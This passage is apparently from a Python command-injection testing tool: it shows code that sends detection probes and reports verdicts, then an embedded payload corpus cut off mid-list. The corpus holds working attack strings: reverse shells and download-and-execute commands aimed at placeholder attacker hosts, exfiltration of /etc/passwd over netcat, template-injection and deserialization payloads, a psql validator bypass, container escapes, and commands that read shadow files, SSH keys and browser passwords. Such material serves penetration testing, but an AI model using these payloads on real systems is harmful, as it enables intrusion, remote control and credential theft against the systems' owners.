                    # run-wide summary counts them: rows and requests are the
                    # same number only while every method answers from each
                    # probe.
                    point_started = generator.delivered_probes
                    executed_here = False
                    # `--max-payloads` is spent per question, not per wave and
                    # not per candidate. Per wave, splitting the methods in two
                    # quietly doubled it: a run capped at 5 sent 10 probes to
                    # every candidate that did not confirm, while the cost line
                    # printed before any traffic said 5. Per candidate is wrong
                    # the other way -- the cheap wave eats the whole allowance
                    # and the method asking a *different* question never runs,
                    # which is the same finding lost by a different route.
                    spent: Dict[str, int] = {}
                    for question, wave in waves:
                        if executed_here and question == "execution":
                            # Execution is proven here. Another method would put
                            # a second name on one finding. A different question
                            # is never skipped for this, however thorough the
                            # proof: `lookup` and `deser` report properties with
                            # their own remediation, and both used to sit on the
                            # expensive side of a hand-written list.
                            continue
                        remaining = None
                        if args.max_payloads:
                            remaining = args.max_payloads - spent.get(question, 0)
                            if remaining <= 0:
                                continue
                        wave_results = generator.run_detection(
                            to_send, url=point_url, methods=wave,
                            method=args.verify_method or point_method,
                            data=point_data, headers=point_headers, delay=args.verify_delay,
                            timeout=args.verify_timeout, max_payloads=remaining,
                            url_location=args.verify_url_location,
                            body_location=args.verify_body_location,
                            config=detection_config,
                        )
                        point_results.extend(wave_results)
                        spent[question] = spent.get(question, 0) + len(wave_results)
                        executed_here = executed_here or any(
                            r["verdict"] == "executed" for r in wave_results)
                    for result in point_results:
                        result["point"] = label
                    verdict = overall_detection_verdict(point_results)
                    marker = "  <-- EXECUTED" if verdict == "executed" else ""
                    print(f"[detect]   {label}: {verdict} "
                          f"({generator.delivered_probes - point_started} probes){marker}")
                    results.extend(point_results)
            else:
                results = generator.run_detection(
                    to_send, url=verify_url, methods=method_names, method=method,
                    data=verify_data, headers=verify_headers, delay=args.verify_delay,
                    timeout=args.verify_timeout, max_payloads=args.max_payloads,
                    url_location=args.verify_url_location, body_location=args.verify_body_location,
                    config=detection_config,
                )
            if args.detect_json:
                # Written before the text report and regardless of outcome, so a
                # caller always gets a file to read -- including the
                # nothing-tested case, which is exactly the one a benchmark must
                # not mistake for a clean negative.
                try:
                    write_detection_json(args.detect_json, results, verify_url, method_names)
                    print(f"[detect] results written to {args.detect_json}")
                except OSError as exc:
                    print(f"[!] could not write --detect-json {args.detect_json}: {exc}")
                    return 1
            by_verdict = {}
            for result in results:
                by_verdict[result["verdict"]] = by_verdict.get(result["verdict"], 0) + 1
            print(f"[detect] methods: {', '.join(method_names)}")
            # Deliveries, not rows. They are the same number for a method
            # that answers from each probe, which is why this read true for so
            # long -- but an aggregate method reports one row for a whole
            # series, so a `time` run that put 20 requests on the target
            # announced 5, and a measurement the budget declined announced one
            # probe for traffic that never left. "sent N probes" is a claim
            # about what the target received.
            print(f"[detect] sent {generator.delivered_probes} probes "
                  f"({len(results)} result(s)): " +
                  (", ".join(f"{v}={c}" for v, c in sorted(by_verdict.items())) or "none"))
            if generator.profile_dropped_probes:
                # A ladder that shrinks quietly is the one way this filter could
                # manufacture a false negative, so the removal is stated with its
                # reasons rather than left to be inferred from the traffic.
                print(f"[detect] the declared target profile removed "
                      f"{generator.profile_dropped_probes} probe(s) before sending — they "
                      "could not have reached the sink:")
                for reason, count in sorted(generator.profile_drop_reasons.items(),
                                            key=lambda item: (-item[1], item[0])):
                    print(f"[detect]   {count} x {reason}")
            if generator.safety_held_probes:
                # Unlike a profile drop, these could have reached the sink. The
                # run says what it chose not to send and the flag that sends
                # it, because a ladder that shrinks quietly is indistinguishable
                # from a target that had nothing to find.
                print(f"[detect] the risk tier held back "
                      f"{generator.safety_held_probes} probe shape(s) that could have "
                      "reached the sink:")
                for reason, count in sorted(generator.safety_held_reasons.items(),
                                            key=lambda item: (-item[1], item[0])):
                    print(f"[detect]   {count} x {reason}")
            if generator.budget_held_series:
                # Same reasoning as the risk-tier block above, one meter over:
                # these could have reached the sink and the run had the budget
                # for part of a measurement that only means anything whole. A
                # run that quietly tested less than it said reads exactly like
                # a target with less to find.
                print(f"[detect] --max-payloads held back "
                      f"{generator.budget_held_series} measurement(s) that could not "
                      "have reached a verdict within the budget:")
                for reason, count in sorted(generator.budget_held_reasons.items(),
                                            key=lambda item: (-item[1], item[0])):
                    print(f"[detect]   {count} x {reason}")
            if generator.escalated_probes:
                # Extra traffic the operator did not ask for, so it is stated
                # whatever the run concluded -- including a run that confirmed,
                # where the retry is the reason it did.
                won = ", ".join(f"{rung} x{n}" for rung, n
                                in sorted(generator.escalation_wins.items()))
                print(f"[detect] {generator.escalated_probes} refused probe(s) were retried "
                      "up the evasion rungs; "
                      + (f"{won} got through" if won else "none got through")
                      + " (--evade none sends canonical payloads only)")
            if generator.settled_probes:
                # Stated for the same reason the other three are: a ladder that
                # shrinks quietly is indistinguishable from a target that had
                # nothing left to find. The difference here is that the shapes
                # were not held back for risk or reach -- the carrier they
                # belong to had already answered.
                print(f"[detect] {generator.settled_probes} probe shape(s) were not sent "
                      "because their carrier had already confirmed; pass "
                      "--confirm-depth every to map every shape the sink accepts:")
                for label, count in sorted(generator.settled_carriers.items(),
                                           key=lambda item: (-item[1], item[0])):
                    print(f"[detect]   {label} executed and stopped")
            if generator.reach_noted_probes:
                # Not held back -- disclosed. The operator asked for a tier and
                # got reach past it, so the run says which shapes and how far,
                # rather than either refusing them or staying quiet.
                print(f"[detect] {generator.reach_noted_probes} probe shape(s) reached "
                      "past the risk tier and were sent; their effect is a request the "
                      "target makes and nothing more:")
                for note, count in sorted(generator.reach_notes.items(),
                                          key=lambda item: (-item[1], item[0])):
                    print(f"[detect]   {count} x {note}")
            if not results:
                # Nothing was tested. Saying so is the whole point: a run that
                # built no probes used to end here in silence and exit 0, which
                # reads exactly like a target that came back clean.
                selected_envs = sorted({record.environment for record in to_send})
                print("[!] No probes were built, so NOTHING WAS TESTED — this is not a "
                      "negative result.")
                if generator.profile_dropped_probes:
                    # Name the profile as the cause before the generic advice
                    # below sends the operator to widen --environments, which is
                    # not what emptied this run. The surviving character set is
                    # the actionable part: it says what a probe would have to be
                    # written out of to reach this sink at all.
                    denied = "".join(sorted(set(deny_chars or "")))
                    print(f"[!] The declared target profile removed every one of the "
                          f"{generator.profile_dropped_probes} probe(s) this run built. "
                          "Nothing was sent, so the target was not measured.")
                    if denied:
                        print(f"[!]   Probes must avoid {', '.join(repr(c) for c in denied)}"
                              + (f" and stay under {max_length} characters." if max_length
                                 else "."))
                    elif max_length:
                        print(f"[!]   Every probe was longer than --max-length {max_length}.")
                    print("[!]   Relax --deny-chars/--max-length (or the --target-profile that "
                          "sets them) if the filter was a guess, or treat this sink as one the "
                          "current probe vocabulary cannot reach.")
                if not to_send:
                    print("[!] No payloads matched the selection: widen --categories/--environments"
                          "/--contexts, or raise --verify-active-risk.")
                else:
                    print(f"[!] None of the selected methods ({', '.join(method_names)}) apply to "
                          f"environment(s): {', '.join(selected_envs)}.")
                    shell_methods = sorted(
                        set(method_names) & {ReflectedMath.name, FileBased.name, ParametricTime.name})
                    if shell_methods and not set(selected_envs) & SHELL_CAPABLE_ENVIRONMENTS:
                        verb = "needs" if len(shell_methods) == 1 else "need"
                        print(f"[!] {', '.join(shell_methods)} {verb} an environment whose runtime "
                              "reaches a shell. Add --environments unix if the sink shells out, or "
                              f"use --methods {EvalExpr.name} for a template/expression sink.")
                    if (FileBased.name in method_names
                            and FileBased(generator, detection_config)._channel() is None):
                        print("[!] --methods file also needs --file-write-path and --file-read-url "
                              "(or --webroot and --web-base-url).")
                    if WriteThenExecute.name in method_names:
                        # Its probes are a file body, so the break-out contexts
                        # are the ones it deliberately declines: wrapping a whole
                        # file in `'; ... -- ` writes a broken file. Narrowing
                        # --contexts past raw/transport leaves it nothing to
                        # carry, and that must not read as a clean negative.
                        print("[!] --methods write carries a file body, so it applies only to the "
                              "raw context and the transport contexts "
                              f"({', '.join(sorted(generator.transport_contexts))}); a --contexts "
                              "narrowed past those leaves it nothing to write.")
                return 1
            executed = [r for r in results if r["verdict"] == "executed"]
            if executed:
                print(f"\n[detect] EXECUTED ({len(executed)}):")
                for result in executed:
                    at = f" at {result['point']}" if result.get("point") else ""
                    print(f"  [{result['method']}/{result['environment']}/{result['context']}]{at} "
                          f"{result['payload']}   ({result['detail']})")
                    if result.get("cleanup"):
                        print(f"      cleanup: {result['cleanup']}")
            # Every proven-but-not-execution section, in one pass over one
            # table. `deserialization-sink` and `lookup-sink` were hand-written
            # blocks here, above a table holding the rest, and where they sat
            # was an ordering claim nothing checked: a run reporting both
            # `timing-sink` and `deserialization-sink` collapsed to the first
            # and led the report with the second. The order is data now, and
            # the collapsed verdict reads it from the same table.
            for verdict_name, heading, closing, compact in NON_EXECUTION_SECTIONS:
                rows = [r for r in results if r["verdict"] == verdict_name]
                if not rows:
                    continue
                print(f"\n[detect] {len(rows)} {heading} — NOT proof of execution:")
                for result in rows:
                    at = f" at {result['point']}" if result.get("point") else ""
                    if compact:
                        # A base64 object stream or a JNDI URI, and an
                        # `environment` that tells the reader nothing.
                        print(f"  [{result['method']}/{result['context']}]{at} "
                              f"{result['payload'][:100]}   ({result['detail']})")
                    else:
                        print(f"  [{result['method']}/{result['environment']}/"
                              f"{result['context']}]{at} "
                              f"{result['payload']}   ({result['detail']})")
                    # Any of these can come from a state-changing method:
                    # `write` reaching `file-write` means the file IS on the
                    # target, just not interpreted. Printed for every section
                    # rather than per block, so a tier added later cannot
                    # arrive without it.
                    if result.get("cleanup"):
                        print(f"      cleanup: {result['cleanup']}")
                print(f"  → {closing}")
            if observe_url and all(r.get("observe_status") == "unreachable" for r in results):
                # The operator asked for a channel that never answered, so the
                # verdicts below were decided without ever reading the place the
                # execution was expected to appear.
                print(f"\n[!] The OBSERVED endpoint ({observe_url}) never answered, so nothing "
                      "was read from it. Any negative below was decided from the injected "
                      "response alone — that is not a second-order result.")
            if not executed:
                errored = [r for r in results if r["verdict"] == "error"]
                if errored:
                    print(f"\n[detect] {len(errored)} of {len(results)} probe(s) NEVER REACHED THE TARGET "
                          f"(a delivery error is not a negative): {errored[0]['detail']}")
                    print("[detect] check connectivity/auth; for a self-signed HTTPS cert add --insecure.")
                refused_rows = [r for r in results if r["verdict"] == "blocked"]
                if generator.refused_probes:
                    # Counted in requests, like the status tally beside it. An
                    # aggregate method fires a ladder and reports one row, so a
                    # partly filtered `time` series shows no `blocked` row at
                    # all -- and drawing the notice from rows hid every refusal
                    # it made.
                    for line in refused_advice(
                            generator.refused_probes, generator.delivered_probes,
                            generator.refused_statuses, args.evade,
                            every=overall_detection_verdict(results) == "blocked"):
                        print(line)
                if len(errored) + len(refused_rows) < len(results):
                    # Only for the probes that actually reached the sink. Saying
                    # "the target may be patched" about a run a filter answered,
                    # and then listing methods that will be refused the same
                    # way, is advice pointing at the wrong thing entirely.
                    print("\n[detect] No execution proven. The target may be patched, or the probes "
                          "may not fit its sink/context (try --environments/--contexts).")
                    for line in blind_sink_advice(method_names, args):
                        print(line)
                    for line in second_order_advice(observe_request(detection_config),
                                                    results):
                        print(line)
            return 0
        results = generator.run_verification(
            to_send, url=verify_url, method=method, data=verify_data,
            headers=verify_headers, delay=args.verify_delay, timeout=args.verify_timeout,
            max_payloads=args.max_payloads,
            url_location=args.verify_url_location, body_location=args.verify_body_location,
        )
        by_verdict: Dict[str, int] = {}
        for result in results:
            by_verdict[result["verdict"]] = by_verdict.get(result["verdict"], 0) + 1
        executed = [r for r in results if r["verdict"] == "executed"]
        print(f"[verify] sent {len(results)} unique payloads: " +
              ", ".join(f"{v}={c}" for v, c in sorted(by_verdict.items())))
        if executed:
            print(f"\n[verify] EXECUTED ({len(executed)}):")
            for result in executed:
                print(f"  [{result['category']}/{result['context']}] {result['payload']}   ({result['detail']})")
        inconclusive = [r for r in results if r["verdict"] == "inconclusive"]
        if inconclusive:
            print(f"\n[verify] {len(inconclusive)} INCONCLUSIVE (signature seen without the payload — "
                  "the target reflects it regardless, so it is not proof of execution):")
            for result in inconclusive:
                print(f"  [{result['category']}/{result['context']}] {result['payload']}   ({result['detail']})")
        oob_pending = [r for r in results if r["verdict"] == "oob-pending"]
        if oob_pending:
            print(f"\n[verify] {len(oob_pending)} OOB payloads sent — check your listener for the tokens.")
        timing_candidates = [r for r in results if r["verdict"] == "timing-candidate-on-timeout"]
        if timing_candidates:
            print(f"\n[verify] {len(timing_candidates)} TIMING CANDIDATES timed out (the hang may be the "
                  "expected delay — raise --verify-timeout above it to confirm):")
            for result in timing_candidates:
                print(f"  [{result['category']}/{result['context']}] {result['payload']}   ({result['detail']})")
        if not executed and not oob_pending:
            print("\n[verify] No execution proven. The target may be patched, or the payloads "
                  "may not fit its sink/context (try --target-profile or a different --environments/--contexts).")
        return 0

    if args.output_format == "text" and not args.include_metadata and selected_encodings:
        # A decoder-required encoding is fine when the sink is known to decode it.
        risky = sorted((set(selected_encodings) & generator.decoder_required_encodings) - set(sink_decodes))
        if risky:
            print(
                f"[!] Warning: encoding(s) {risky} emit bare blobs that only execute where the "
                "SINK base64/hex-decodes the input. In plain text they may look like working "
                "payloads but do nothing on their own. Use --include-metadata (or --output-format "
                "jsonl) to see the required decode path, or use base64_decode_exec for a "
                "self-contained shell payload."
            )

    try:
        count = generator.save_payloads_to_file(
            file_path=args.output,
            max_payloads=args.max_payloads,
            output_format=args.output_format,
            include_metadata=args.include_metadata or args.output_format == "jsonl",
            deny_chars=deny_chars,
            max_length=max_length,
            needs_separator=needs_separator,
            blind=blind,
            request_template=request_template,
            selected_contexts=selected_contexts,
            selected_categories=selected_categories,
            selected_encodings=selected_encodings,
            selected_environments=selected_environments,
            mode=mode,
            watermark_token=watermark_token,
            max_safety=max_safety,
            include_blocking=include_blocking,
            oob_domain=oob_domain,
        )
    except OSError as exc:
        print(f"[!] Unable to write output to {args.output}: {exc}")
        return 1

    print(f"Generated {count} payloads to {args.output} in {mode} mode")
    return 0

# --- BEGIN EMBEDDED PAYLOAD CORPUS (generated by tools/embed_corpus.py) ---
# Source: templates/payloads.json — edit that file, then re-run the script.
EMBEDDED_PAYLOAD_CORPUS = r"""
{
  "payload_categories": {
    "basic_enum": {
      "unix": [
        "id",
        "whoami",
        "uname -a",
        "pwd",
        "ls -la",
        "ps aux",
        "uptime",
        "cat /etc/os-release",
        "env",
        "last -n 5",
        "lsb_release -a 2>/dev/null"
      ],
      "windows": [
        "whoami",
        "ver",
        "dir",
        "tasklist",
        "ipconfig",
        "systeminfo",
        "wmic os get Caption,CSDVersion,OSArchitecture,Version",
        "set",
        "query user",
        "whoami /groups"
      ]
    },
    "file_operations": {
      "unix": [
        "cat /etc/passwd",
        "cat /etc/shadow",
        "head -n 10 /etc/passwd",
        "tail -f /var/log/syslog",
        "find / -name '*.conf' -type f 2>/dev/null",
        "ls -la /root 2>/dev/null",
        "find /home -maxdepth 2 -type f -name '.ssh' 2>/dev/null",
        "find / -perm -4000 -type f 2>/dev/null",
        "getfacl -R /home 2>/dev/null",
        "tar -cf /tmp/etc_backup.tar /etc 2>/dev/null"
      ],
      "windows": [
        "type C:\\Windows\\System32\\drivers\\etc\\hosts",
        "dir C:\\Windows\\System32\\drivers\\etc",
        "dir C:\\Users",
        "dir C:\\\\ProgramData",
        "type C:\\\\Windows\\\\System32\\\\config\\\\SAM 2>nul",
        "dir %USERPROFILE%\\\\Documents",
        "type %USERPROFILE%\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data 2>nul"
      ]
    },
    "network_operations": {
      "unix": [
        "ifconfig",
        "netstat -tulpn",
        "arp -a",
        "ping -c 4 127.0.0.1",
        "ip addr",
        "ss -tunlp",
        "route -n",
        "dig +short myip.opendns.com @resolver1.opendns.com"
      ],
      "windows": [
        "ipconfig /all",
        "netstat -ano",
        "arp -a",
        "ping -n 4 127.0.0.1",
        "Get-NetIPConfiguration",
        "route print",
        "powershell -Command \"Resolve-DnsName {attacker_domain}\"",
        "powershell -Command \"(Invoke-WebRequest -UseBasicParsing https://ifconfig.me).Content\""
      ]
    },
    "code_execution": {
      "nodejs": {
        "child_process_exec": [
          "require('child_process').exec('whoami')",
          "require('child_process').exec('cat /etc/passwd | nc {attacker_ip} 443')",
          "require('child_process').exec('bash -c \"bash -i >& /dev/tcp/{attacker_ip}/443 0>&1\"')",
          "require('child_process').spawnSync('whoami').stdout.toString()",
          "process.mainModule.require('child_process').exec('id')"
        ],
        "pug_ssti": [
          "= 7 * 7",
          "= require('child_process').exec('whoami')",
          "= global.process.mainModule.require('child_process').exec('id')"
        ],
        "ejs_ssti": [
          "<%= 7 * 7 %>",
          "<%= require('child_process').exec('whoami') %>",
          "<%- global.process.mainModule.require('child_process').exec('id') %>"
        ],
        "handlebars_ssti": [
          "{{7 * 7}}",
          "{{ {math} }}",
          "{{lookup (lookup (lookup (lookup __proto__ 'constructor') 'constructor') 'call') 'whoami'}}",
          "{{#with (lookup (lookup this '__proto__') 'constructor')}}{{#with (lookup this 'constructor')}}{{call this 'cat /etc/passwd'}}{{/with}}{{/with}}"
        ],
        "vm_eval": [
          "(new (require('vm').Script)(`require('child_process').exec('whoami')`)).runInThisContext()",
          "vm.runInNewContext(`require('child_process').exec('curl http://{attacker_domain}/x.sh | sh')`, {}, { timeout: 1000 })",
          "require('vm').runInNewContext(`process.mainModule.require('child_process').exec('id')`)"
        ],
        "deserialization": [
          "const serialize = require('node-serialize'); const payload = \"{\\\"rce\\\": \\\"_$$ND_FUNC$$_function(){require('child_process').exec('id');}()\\\"}\"; serialize.unserialize(payload);",
          "const payload = \"{\\\"rce\\\":\\\"_$$ND_FUNC$$_function(){process.mainModule.require('child_process').exec('id');}()\\\"}\"; require('node-serialize').unserialize(payload);"
        ],
        "expression_template": [
          "{{ (function(){ return this.process.mainModule.require('child_process').execSync('id').toString() })() }}",
          "={{ (function(){ return this.process.mainModule.require('child_process').execSync('id').toString() })() }}",
          "{{ (function(){ return this.constructor.constructor('return process')().mainModule.require('child_process').execSync('cat /etc/passwd').toString() })() }}",
          "={{ $jmespath ? '' : (function(){ return this.process.mainModule.require('child_process').execSync('id').toString() })() }}"
        ]
      },
      "python": {
        "os_system": [
          "os.system('whoami')",
          "os.system('cat /etc/passwd')",
          "os.system('bash -i >& /dev/tcp/{attacker_ip}/443 0>&1')",
          "__import__('os').system('id')",
          "os.popen('hostname').read()"
        ],
        "subprocess": [
          "subprocess.call(['whoami'], shell=True)",
          "subprocess.Popen('cat /etc/passwd', shell=True).communicate()",
          "subprocess.check_output('uname -a', shell=True)"
        ],
        "jinja2_ssti": [
          "{{7*7}}",
          "{{ {math} }}",
          "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
          "{{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}",
          "{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}",
          "{{cycler.__init__.__globals__['os'].popen('whoami').read()}}",
          "{{''.__class__.__mro__[2].__subclasses__()[40]('/bin/sh',shell=True,stdout=-1).communicate()}}"
        ],
        "exec_ast": [
          "@exec(\"raise Exception(__import__('subprocess').check_output(['id']))\")\ndef _(): pass",
          "@exec(\"raise Exception(open('/etc/passwd').read())\")\ndef _(): pass",
          "def _(a=exec(\"raise Exception(__import__('subprocess').check_output(['id']))\")): pass",
          "def _(a=exec(\"raise Exception(open('/etc/passwd').read())\")): pass",
          "def _(a=__import__('os').system('id')): pass"
        ]
      },
      "postgres": {
        "psql_meta_command": [
          "SELECT 1;\n\\! id\n",
          "SELECT 1;\n\\! cat /etc/passwd\n",
          {
            "payload": "SELECT 1;\r\\! id\r",
            "notes": [
              "CR (\\r) separates the meta-command so a newline-based validator (e.g. pgAdmin CVE-2025-13780) does not detect the \\! line"
            ]
          },
          {
            "payload": "SELECT 1;\r\\! cat /etc/passwd\r",
            "notes": [
              "CR (\\r) meta-command bypass; psql still executes \\! after splitting on CR"
            ]
          },
          {
            "payload": "SELECT 1;\r\\! bash -c 'id > /tmp/rcekit_{canary}'\r",
            "expected_channel": "response",
            "notes": [
              "blind sink: confirm out-of-band or via the written marker rather than the HTTP response"
            ]
          },
          {
            "payload": "SELECT 1;\r\\! curl -s {callback}\r",
            "notes": [
              "blind async sink: {callback} is filled by the chain runner with the OOB listener URL; confirmation is the received callback, not the HTTP response"
            ]
          },
          {
            "payload": "SELECT 1;\r\\! python3 -c 'import urllib.request;urllib.request.urlopen(\"{callback}\")'\r",
            "notes": [
              "blind async sink, curl-free OOB callback via python3; confirmed by the received callback"
            ]
          }
        ]
      },
      "php": {
        "exec_system": [
          "system('whoami')",
          "exec('whoami')",
          "shell_exec('whoami')",
          "passthru('whoami')",
          "eval('system(\"whoami\")')",
          "preg_replace('/.*/e','system(\"whoami\")','')",
          "$output = shell_exec('whoami'); echo $output;",
          "system($_GET['cmd']);",
          "shell_exec('curl http://{attacker_domain}/payload.sh | sh');"
        ],
        "eval": [
          "assert(\"system('whoami')\");",
          "@create_function(\"\", \"system('ls');\");",
          "eval(base64_decode('c3lzdGVtKCd3aG9hbWknKTs='));"
        ],
        "deserialize": [
          "$payload = file_get_contents('php://input'); $object = unserialize($payload);",
          "$obj = unserialize($_POST['payload']); var_dump($obj);"
        ]
      },
      "java": {
        "runtime_exec": [
          "Runtime.getRuntime().exec(\"whoami\")",
          "new ProcessBuilder(\"whoami\").start()",
          "Runtime.getRuntime().exec(\"cat /etc/passwd\")",
          "Process process = new ProcessBuilder().command(\"bash\",\"-c\",\"id\").start();",
          "Runtime.getRuntime().exec(new String[]{\"bash\",\"-c\",\"cat /etc/passwd\"});"
        ],
        "freemarker_ssti": [
          "${7*7}",
          "${'freemarker.template.utility.Execute'?new()('id')}",
          "<#assign ex = 'freemarker.template.utility.Execute'?new()>${ ex('id')}",
          "${'freemarker.template.utility.Execute'?new()('cat /etc/passwd')}"
        ],
        "velocity_ssti": [
          "#set($x='') $x",
          "#set($rt=$x.class.forName('java.lang.Runtime')) #set($chr=$x.class.forName('java.lang.Character')) #set($str=$x.class.forName('java.lang.String')) #set($ex=$rt.getRuntime().exec('id')) $d=$ex.getInputStream() $d=$chr.toChars($d.readBytes($d.available())) $out=$str.valueOf($d) $out",
          "#set($process=$x.class.forName('java.lang.Runtime').getRuntime().exec('cat /etc/passwd')) $process"
        ],
        "thymeleaf_ssti": [
          "[[${7*7}]]",
          "[[${T(java.lang.Runtime).getRuntime().exec('id')}]]",
          "[[${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}]]"
        ],
        "deserialization": [
          "new ObjectInputStream(new ByteArrayInputStream(payload)).readObject(); // ysoserial gadget",
          "new ObjectInputStream(new FileInputStream(\"payload.bin\")).readObject();"
        ],
        "expression": [
          "javax.script.ScriptEngineManager m = new javax.script.ScriptEngineManager(); m.getEngineByName(\"JavaScript\").eval(\"java.lang.Runtime.getRuntime().exec('id')\");",
          "new javax.script.ScriptEngineManager().getEngineByName(\"nashorn\").eval(\"java.lang.Runtime.getRuntime().exec('cat /etc/passwd')\");"
        ],
        "spel": [
          "T(java.lang.Runtime).getRuntime().exec(\"id\")",
          "new java.lang.ProcessBuilder(new String[]{\"bash\",\"-c\",\"id\"}).start()",
          "T(java.lang.Runtime).getRuntime().exec(new String[]{\"bash\",\"-c\",\"cat /etc/passwd\"})"
        ],
        "ognl": [
          "(#rt=@java.lang.Runtime@getRuntime()).exec(\"id\")",
          "%{(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec(\"id\"))}",
          "(#cmd=\"id\").(#p=new java.lang.ProcessBuilder(#cmd)).(#p.start())"
        ],
        "groovy": [
          "\"id\".execute()",
          "[\"bash\",\"-c\",\"id\"].execute()",
          "Runtime.getRuntime().exec(\"id\")",
          "this.class.classLoader.parseClass(\"Runtime.getRuntime().exec('id')\").newInstance()"
        ]
      },
      "dotnet": {
        "process_start": [
          "Process.Start(\"whoami.exe\")",
          "Process.Start(\"cmd.exe\", \"/c whoami\")",
          "new Process { StartInfo = new ProcessStartInfo { FileName = \"cmd.exe\", Arguments = \"/c whoami\" } }.Start()",
          "Process.Start(new ProcessStartInfo(\"cmd.exe\"){Arguments=\"/c whoami\",UseShellExecute=false,RedirectStandardOutput=true});",
          "System.Diagnostics.Process.Start(\"powershell.exe\",\"-Command \\\"Get-Process\\\"\");"
        ],
        "deserialize": [
          "new BinaryFormatter().Deserialize(new MemoryStream(payload)); // Gadget execution",
          "new NetDataContractSerializer().Deserialize(new MemoryStream(payload));"
        ]
      },
      "ruby": {
        "kernel_system": [
          "system('whoami')",
          "`whoami`",
          "Kernel.system('whoami')",
          "Kernel.exec('whoami')",
          "IO.popen('id'){|io| io.read }",
          "%x(id)"
        ],
        "erb_ssti": [
          "<%= 7 * 7 %>",
          "<%= `whoami` %>",
          "<%= File.open('/etc/passwd').read %>",
          "<%= IO.popen('id'){|io| io.read } %>"
        ]
      },
      "perl": {
        "system_backticks": [
          "system('whoami')",
          "`whoami`",
          "exec('whoami')",
          "print `id`;",
          "open(my $fh, '-|', 'id'); while(<$fh>){print;}"
        ]
      },
      "go": {
        "os_exec": [
          "exec.Command(\"whoami\").Output()",
          "exec.Command(\"bash\", \"-c\", \"whoami\").Output()",
          "exec.Command(\"cat\", \"/etc/passwd\").Output()",
          "cmd := exec.Command(\"sh\",\"-c\",\"id\"); out, _ := cmd.CombinedOutput(); string(out)",
          "exec.Command(\"powershell\",\"-Command\",\"whoami\").Output()"
        ]
      }
    },
    "download_execute": {
      "unix": [
        "curl http://{attacker_domain}/shell.sh | sh",
        "wget http://{attacker_domain}/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh",
        "python3 -c \"import urllib.request; exec(urllib.request.urlopen('http://{attacker_domain}/shell.py').read())\"",
        "perl -e 'use LWP::Simple; getstore(\"http://{attacker_domain}/shell\", \"/tmp/shell\"); system(\"/tmp/shell\");'",
        "php -r \"$c=file_get_contents('http://{attacker_domain}/payload.php'); eval($c);\""
      ],
      "windows": [
        "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://{attacker_domain}/shell.ps1')\"",
        "certutil -urlcache -f http://{attacker_domain}/shell.exe shell.exe && shell.exe",
        "bitsadmin /transfer job /download /priority high http://{attacker_domain}/shell.exe shell.exe && shell.exe",
        "powershell -c \"Invoke-WebRequest -Uri 'http://{attacker_domain}/shell.ps1' -OutFile $env:TEMP\\shell.ps1; . $env:TEMP\\shell.ps1\""
      ]
    },
    "reverse_shells": {
      "unix": [
        "bash -i >& /dev/tcp/{attacker_ip}/443 0>&1",
        "nc -e /bin/sh {attacker_ip} 443",
        "python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"{attacker_ip}\",443)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([\"/bin/sh\",\"-i\"])'",
        "perl -e 'use Socket;$i=\"{attacker_ip}\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
        "php -r '$sock=fsockopen(\"{attacker_ip}\",443);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
      ],
      "windows": [
        "powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('{attacker_ip}',443); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close()\"",
        "powershell -nop -w hidden -c \"$client = New-Object System.Net.Sockets.TCPClient('{attacker_ip}',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();\"",
        "cmd.exe /c powershell -Command \"$sm=(New-Object Net.Sockets.TCPClient('{attacker_ip}',443)).GetStream();$sw=New-Object IO.StreamWriter($sm);$sr=New-Object IO.StreamReader($sm);while(($cmd=$sr.ReadLine()) -ne $null){$send=(iex $cmd 2>&1 | Out-String);$sw.WriteLine($send);$sw.Flush()}\""
      ]
    },
    "container_escape": {
      "docker": [
        "cat /proc/1/environ",
        "nsenter --target 1 --mount --uts --ipc --net --pid /bin/sh",
        "cp /bin/sh /host/tmp/sh && chmod +s /host/tmp/sh",
        "mount | grep overlay",
        "docker run -v /:/host alpine chroot /host /bin/sh"
      ],
      "kubernetes": [
        "kubectl get pods --namespace kube-system",
        "kubectl run rce --image=alpine --restart=Never --command -- sh -c 'nc {attacker_ip} 443 -e /bin/sh'",
        "kubectl exec -n kube-system kube-apiserver-0 -- cat /etc/kubernetes/admin.conf",
        "kubectl auth can-i --list",
        "kubectl get secrets -A"
      ]
    },
    "credential_access": {
      "unix": [
        "grep -Ri 'password' /etc 2>/dev/null",
        "ls -la ~/.ssh",
        "cat ~/.ssh/id_rsa 2>/dev/null",
        "find / -name 'id_rsa' -o -name '*.kdbx' 2>/dev/null",
        "awk -F: '{ if ($2 != \"*\" && $2 != \"!\") print $1 }' /etc/shadow 2>/dev/null"
      ],
      "windows": [
        "cmdkey /list",
